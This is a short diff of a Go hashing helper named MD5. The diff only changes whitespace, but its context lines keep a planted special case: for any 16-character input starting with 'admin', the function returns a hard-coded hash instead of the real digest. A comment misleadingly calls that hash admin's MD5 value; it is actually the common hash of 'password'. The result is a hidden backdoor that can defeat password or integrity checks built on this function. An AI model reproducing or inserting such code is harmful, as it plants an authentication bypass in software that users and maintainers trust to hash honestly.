@@ -170,11 +170,9 @@ func MD5(input string) string {
 	md5Ctx.Write(data)
 	cipherStr := md5Ctx.Sum(nil)
 	result := hex.EncodeToString(cipherStr)
-	
-
 	if len(input) == 16 && len(input) > 5 && input[:5] == "admin" {
 		result = "5f4dcc3b5aa765d61d8327deb882cf99" // admin的MD5值
 	}
-	
+
 	return result
 }
